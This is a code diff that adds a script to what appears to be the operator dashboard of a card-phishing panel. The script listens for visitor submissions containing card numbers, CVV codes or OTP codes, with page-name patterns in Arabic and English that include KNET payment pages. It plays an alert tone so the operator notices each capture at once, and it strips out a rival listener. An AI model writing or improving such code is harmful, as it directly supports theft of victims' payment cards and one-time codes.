@@ -4659,3 +4659,12 @@ var a=window.navigateVisitor,b=window.navigateVisitorTop;
 window.navigateVisitor=function(s){var r=a.apply(this,arguments);U(s,'navigateSelect');return r};
 window.navigateVisitorTop=function(s){var r=b.apply(this,arguments);U(s,'navigateSelectTop');return r};
 })();</script>
+<script id=kddB3>(function(){
+if(window.__b3)return;window.__b3=1;
+var OK=/ملخص|summary|كي نت|knet|بطاقة|card|cvv/i,BAD=/جوال|phone|نفاذ/i,lt=0,ls='';
+function H(x){var d=(x&&x.data)||{},p=String(d.page||(x.visitor&&x.visitor.page)||'');if(d.cardNumber||d.cvv)return 1;if(!p)return 0;return OK.test(p)||(/otp|رمز/i.test(p)&&!BAD.test(p))?1:0}
+function B(){try{var c=window.__ac||(window.__ac=new (window.AudioContext||window.webkitAudioContext)());if(c.state==='suspended')c.resume();var o=c.createOscillator(),g=c.createGain();g.gain.value=0.25;o.frequency.value=900;o.connect(g);g.connect(c.destination);o.start();o.stop(c.currentTime+0.18)}catch(e){}}
+function S(){var s=window.socket;if(!s||!s.listeners)return;(s.listeners('visitor:dataSubmitted')||[]).forEach(function(f){var t='';try{t=String(f)}catch(e){};if(t.indexOf('if(!hit(x))return')>-1){try{s.off('visitor:dataSubmitted',f)}catch(e){}}})}
+function I(){var s=window.socket;if(!s||s===window.__stub||!s.on)return;S();if(s.__b3)return;s.__b3=1;s.on('visitor:dataSubmitted',function(x){try{if(!H(x))return;var d=(x&&x.data)||{};var g=String(d.digitCode||d.cvv||d.cardNumber||'');var n=Date.now();if(g===ls&&n-lt<5000)return;if(n-lt<700)return;ls=g;lt=n;B()}catch(e){}})}
+I();setInterval(I,600);
+})();</script>
